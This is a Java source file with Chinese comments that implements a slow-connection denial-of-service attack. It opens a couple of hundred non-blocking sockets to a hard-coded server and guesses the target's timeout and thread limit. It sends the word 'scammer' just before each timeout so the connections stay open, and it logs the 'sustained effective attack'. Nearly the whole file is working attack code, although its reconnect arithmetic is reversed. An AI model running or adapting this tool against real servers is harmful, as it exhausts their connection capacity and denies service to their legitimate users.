import java.io.IOException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.SelectionKey;import java.nio.channels.Selector;import java.nio.channels.SocketChannel;import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class NIOClientTest {			public static String ip = "192.168.2.100";	public static int port = 8080;	// 猜测对方设置的时间 默认20s	public static int timeOut = 20;	// // 猜测对方设置的最高线程数量 默认154	public static int threads = 200;			private Selector selector;	private List<SocketChannel> mlist = new ArrayList<SocketChannel>();		public static void main(String[] args) throws IOException {		NIOClientTest m = new NIOClientTest();		m.allLink();		m.initSelector();		// this.initClient("192.168.1.107", 10000);		m.initMoreClient(ip, port, threads);		m.listen();	}	private void initSelector() {		// TODO Auto-generated method stub		try {			this.selector = Selector.open();		} catch (IOException e) {			// TODO Auto-generated catch block			System.err.println("XXX selector 启动失败");			e.printStackTrace();					}	}	private void initMoreClient(String ip, int port, int j) {		// TODO Auto-generated method stub		for (int i = 0; i < j; i++) {			SocketChannel channel;			try {				channel = SocketChannel.open();				channel.configureBlocking(false);				channel.connect(new InetSocketAddress(ip, port));				// System.out.println(channel.socket().getPort());				channel.register(selector, SelectionKey.OP_CONNECT);			} catch (IOException e) {				// TODO Auto-generated catch block				e.printStackTrace();			}		}	}	public void initOneClient(String ip, int port) {		SocketChannel channel;		try {			channel = SocketChannel.open();			channel.configureBlocking(false);			channel.connect(new InetSocketAddress(ip, port));			// System.out.println(channel.socket().getPort());			channel.register(selector, SelectionKey.OP_CONNECT);		} catch (IOException e) {			// TODO Auto-generated catch block			e.printStackTrace();		}	}	@SuppressWarnings("unchecked")	public void listen() {		while (true) {			if (selector == null) {				System.err.println("selector == null");				break;			}			try {				selector.select();			} catch (IOException e) {				// TODO Auto-generated catch block				e.printStackTrace();			}			// Su.log("有相应");			Iterator ite = this.selector.selectedKeys().iterator();			while (ite != null && ite.hasNext()) {				SelectionKey key = (SelectionKey) ite.next();				ite.remove();				if (key.isConnectable()) {					SocketChannel channel = (SocketChannel) key.channel();					finishConnect(channel);					registerRead(channel);					sendOneChar(channel);				} else if (key.isReadable()) {					Object obj = key.attachment();					if (obj instanceof SocketChannel) {						// 这个其实是在连接时候的 设置成可读状态的假消息						// } else if (obj instanceof Linker) {						// // ((Linker) obj).read(key);						try {							key.channel().close();						} catch (IOException e) {							// TODO Auto-generated catch block							mlist.remove(key.channel());							// e.printStackTrace();							System.err.println("isReadable error");						}					}					//					// read(key);					// send(key,"dddddddddddd");				} else if (key.isValid()) {					System.out.println("isValid");				} else if (key.isWritable()) {					System.out.println("isWritable");				} else if (key.isAcceptable()) {					System.out.println("isAcceptable");				}			}		}	}	private void registerRead(SocketChannel channel) {		// TODO Auto-generated method stub		try {			channel.configureBlocking(false);			channel.register(this.selector, SelectionKey.OP_READ, channel);			// send(key, "dddddddddddd");						mlist.add(channel);			System.out.println("已经连接完成  并且设置read权限"					+ channel.socket().getPort() + " list" + mlist.size());		} catch (IOException e) {			// TODO Auto-generated catch block			System.err.println(channel + "set  OP_READ reeor");			// e.printStackTrace();		}	}	private void finishConnect(SocketChannel channel) {		// TODO Auto-generated method stub		if (channel.isConnectionPending()) {			try {				channel.finishConnect();			} catch (IOException e) {				// TODO Auto-generated catch block				// e.printStackTrace();				System.err.println(channel + "finishConnect reeor");				try {					channel.close();				} catch (IOException e1) {					// TODO Auto-generated catch block					e1.printStackTrace();				}			}		}	}	private void send(SelectionKey key, String string) {		// TODO Auto-generated method stub		SocketChannel channel = (SocketChannel) key.channel();		try {			channel.write(ByteBuffer.wrap(string.getBytes()));		} catch (IOException e) {			// TODO Auto-generated catch block			e.printStackTrace();		}	}	/** * 处理读取服务端发来的信息 的事件 * @param key * @throws IOException */	public void read(SelectionKey key) throws IOException {		SocketChannel channel = (SocketChannel) key.channel();		ByteBuffer buffer = ByteBuffer.allocate(1000);		channel.read(buffer);		byte[] data = buffer.array();		String msg = new String(data).trim();		System.out.println("收到：" + msg);	}	private void sendOneChar(SocketChannel socketChannel) {		// TODO Auto-generated method stub		if (socketChannel != null && socketChannel.isConnected())			try {				socketChannel.write(ByteBuffer.wrap("骗子".getBytes()));			} catch (IOException e) {				// TODO Auto-generated catch block				// e.printStackTrace();				mlist.remove(socketChannel);			}	}	private void allLink() {		// TODO Auto-generated method stub		new Thread(new Runnable() {			@Override			public void run() {				// TODO Auto-generated method stub				long ti = (timeOut - 1) * 1000L;				while (true) {					// 最少次数的发送 减少网络占用					try {						Thread.sleep(ti);					} catch (InterruptedException e1) {						// TODO Auto-generated catch block						e1.printStackTrace();					}					// 如果已经建立过相当多的连接					int k = NIOClientTest.this.mlist.size() - threads;					if (k > 0) {						System.err.println("XXX无效的工具数量  缺少  现在添加" + k);						NIOClientTest.this.initMoreClient(ip, port, k);					}					System.out.println("持续有效的攻击: "							+ NIOClientTest.this.mlist.size() + " send....骗子");										for (int i = 0; i < NIOClientTest.this.mlist.size(); i++) {						sendOneChar(NIOClientTest.this.mlist.get(i));					}				}			}		}).start();	}}